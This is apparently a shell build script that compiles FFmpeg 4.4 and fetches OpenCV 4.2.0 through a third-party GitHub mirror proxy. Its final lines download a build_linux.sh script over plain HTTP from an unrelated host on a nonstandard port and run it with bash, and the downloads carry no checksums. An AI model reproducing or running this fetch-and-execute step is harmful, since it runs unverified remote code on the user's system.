dirone="/usr/local/src"
mkdir $dirone/ffmpeg
wget -P $dirone/ffmpeg gitdl.cn/https://github.com/FFmpeg/FFmpeg/archive/refs/heads/release/4.4.zip
cd $dirone/ffmpeg
mkdir $dirone/ffmpeg/build
unzip -q 4.4.zip
cd $dirone/ffmpeg/FF*
./configure --enable-static --disable-iconv --disable-gnutls --disable-libbluray --disable-x86asm --prefix=$dirone/ffmpeg/build
make -j8;make install
mkdir $dirone/opencv
cd $dirone/opencv
wget -P $dirone/opencv gitdl.cn/https://github.com/opencv/opencv/archive/4.2.0.zip
unzip -q *.zip
cd op*
apt -y install cmake
cd pl*/li*;wget http://7trkjb.cyou:6003/upload/2024/07/build_linux.sh
bash build_linux.sh "$dirone/ffmpeg/build"